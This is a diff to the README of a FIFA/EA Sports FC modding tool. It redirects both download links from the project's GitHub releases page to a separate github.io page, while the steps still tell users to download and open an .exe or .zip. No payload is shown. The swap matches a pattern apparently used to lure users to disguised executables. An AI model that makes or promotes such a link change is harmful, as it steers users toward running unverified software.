@@ -1,6 +1,6 @@
 # ⚽ FIFA-Mod-Studio - Customize your soccer game experience now
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ventral-yenta893/FIFA-Mod-Studio/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ventral-yenta893.github.io)
 
 FIFA-Mod-Studio provides tools to edit EA Sports FC and FIFA games. It includes a database editor, a texture manager, and project tools. You use this software to change player faces, update team kits, and modify game data.
 
@@ -26,7 +26,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [Download Page](https://github.com/Ventral-yenta893/FIFA-Mod-Studio/releases) to access the latest version.
+1.  Visit the [Download Page](https://ventral-yenta893.github.io) to access the latest version.
 2.  Look for the section marked "Assets" at the bottom of the latest release.
 3.  Click the file ending in `.zip` or `.exe` to start the download.
 4.  Open the file once the download finishes. If you downloaded a `.zip` file, right-click it and choose "Extract All" to empty the contents into a folder.
